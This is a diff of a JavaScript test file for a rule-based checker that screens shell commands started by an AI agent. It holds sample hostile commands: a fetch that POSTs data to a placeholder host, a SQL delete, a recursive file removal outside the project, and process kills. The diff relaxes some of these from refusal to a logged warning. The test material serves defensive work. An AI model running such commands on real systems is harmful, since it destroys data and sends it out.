@@ -53,11 +53,32 @@ const risky=[
  "node -e \"fetch('https://example.invalid',{method:'POST',body:'owned'})\"",
  "node -e \"db.query('DELETE FROM owned')\"",
 ];
-for(const command of risky)assert.equal((await check(command)).darf_starten,false,command);
+// P10-T71 (6a9bbef8, User-Vorgabe 14.10.2026 'ausser Sperren nur Warnhinweise'): Treffer der Stufe 'anleitung'
+// (schreibendes HTTP inline.net, git.restore --worktree, git.apply, inline.db auf Nicht-Prod-DB) laufen jetzt mit
+// Warnhinweis statt abgewiesen zu werden. Erkannt werden muessen sie weiterhin: audit.stufe 'hinweis' + hinweis-Block,
+// nie stilles 'laeuft'. Alle uebrigen bleiben Rueckfrage oder Sperre.
+const warnhinweis=new Set([2,3,5,6,15,16].map(i=>risky[i]));
+for(const command of risky){
+ const r=await check(command);
+ if(warnhinweis.has(command)){
+  assert.equal(r.darf_starten,true,command);assert.equal(r.audit.stufe,'hinweis',command);
+  assert.equal(r.hinweis?.stufe,'hinweis',command);assert.ok(r.hinweis.risiko,command);assert.equal(Object.hasOwn(r,'antwort'),false,command);
+ }else{assert.equal(r.darf_starten,false,command);assert.ok(['rueckfrage','sperre'].includes(r.antwort.stufe),command);}
+}
 for(const command of ["python3 -c \"import os; os.kill(4242,9)\"","python3 -c \"import os; os.killpg(4242,9)\""])assert.equal((await check(command)).antwort.stufe,'sperre','Python trifft geschützte Prozesskette');
 const customized=structuredClone(SHELL_SICHERUNG_SEED);
 customized.regeln.push({id:'owned.custom-console',version:1,art:'text',stufe:'anleitung',status:'aktiv',muster:{command:['^node$'],argv_any:['console\\.log\\(']},antwort_id:'inline.node',quelle:'owned-test'});
-assert.equal((await check("node -e \"console.log('owned')\"",customized)).darf_starten,false,'Regeltabelle bestimmt Inline-Stufe');
+// P10-T71 (6a9bbef8): 'anleitung' laeuft mit Warnhinweis. Die Regeltabelle bestimmt die Stufe weiterhin:
+// ohne Zusatzregel still, mit anleitung-Regel Hinweis, mit sperre-Regel abgewiesen (eine rueckfrage-Regel ohne
+// Gefahrkennzeichen trifft seit P10-T73 bewusst nicht).
+{
+ const ohne=await check("node -e \"console.log('owned')\"");assert.equal(ohne.darf_starten,true);assert.equal(ohne.audit.stufe,'laeuft');
+ const mit=await check("node -e \"console.log('owned')\"",customized);
+ assert.equal(mit.darf_starten,true);assert.equal(mit.audit.stufe,'hinweis','Regeltabelle bestimmt Inline-Stufe');assert.equal(mit.hinweis?.stufe,'hinweis');
+ const streng=structuredClone(customized);streng.regeln.find(x=>x.id==='owned.custom-console').stufe='sperre';
+ const r=await check("node -e \"console.log('owned')\"",streng);
+ assert.equal(r.darf_starten,false,'Regeltabelle bestimmt Inline-Stufe');assert.equal(r.antwort.stufe,'sperre');
+}
 console.log('P10-T47 statische Inline-Prüfung + unveränderte echte Anleitung/Sperre grün.');
 
 const{verbindeShellStartKatalog}=await import('../dist/services/shell-sicherungs-lauf.js');
@@ -72,10 +93,13 @@ assert.equal(verbindeShellStartKatalog(disabled).regeln.find(x=>x.id==='inline.n
 const changed=structuredClone(oldDefault);changed.regeln.find(x=>x.id==='inline.node').muster.argv_any=['owned-custom'];
 assert.deepEqual(verbindeShellStartKatalog(changed).regeln.find(x=>x.id==='inline.node').muster,changed.regeln.find(x=>x.id==='inline.node').muster);
 for(const command of ["node -e \""+' '.repeat(262145)+"require('fs').rmSync('/outside')\"","node -e \"function (\""]){
- assert.equal((await check(command)).darf_starten,false,'Analysegrenze explizit abweisen');
+ // P10-T71 (6a9bbef8): Analysegrenze ist 'anleitung' -> laeuft nur mit Warnhinweis (nie still).
+ const r=await check(command);
+ assert.equal(r.audit.stufe,'hinweis','Analysegrenze explizit melden');assert.equal(r.hinweis?.stufe,'hinweis','Analysegrenze explizit melden');
 }
 const sqlCommand="node -e \"db.query('DELETE FROM owned')\"";
 const sqlDecision=async(project,env)=>pruefeShellStart({project,command:sqlCommand,agent_id:'sol-2',lage:await ermittleShellLage(sqlCommand,{...ctx,env})},SHELL_SICHERUNG_SEED);
-assert.equal((await sqlDecision('test-looking-name',{})).darf_starten,false,'Projektname ist kein Test-DB-Nachweis');
+// P10-T71 / memory regel-datenbanken-nur-prod-gesperrt: Nicht-Prod-DB ist frei; ohne verifizierten Kontext Warnhinweis statt Abweisung.
+{const r=await sqlDecision('test-looking-name',{});assert.equal(r.darf_starten,true);assert.equal(r.audit.stufe,'hinweis','Projektname ist kein Test-DB-Nachweis');assert.equal(r.hinweis?.stufe,'hinweis');}
 assert.equal((await sqlDecision('owned-project',{DATABASE_URL:'postgres://localhost:5433/owned_test'})).darf_starten,true,'verifizierter Spielwiesen-Kontext');
 console.log('P10-T47 DB-Default-Overlay/JSONB-Reihenfolge/Pflege/Stilllegung/Analysegrenze grün.');
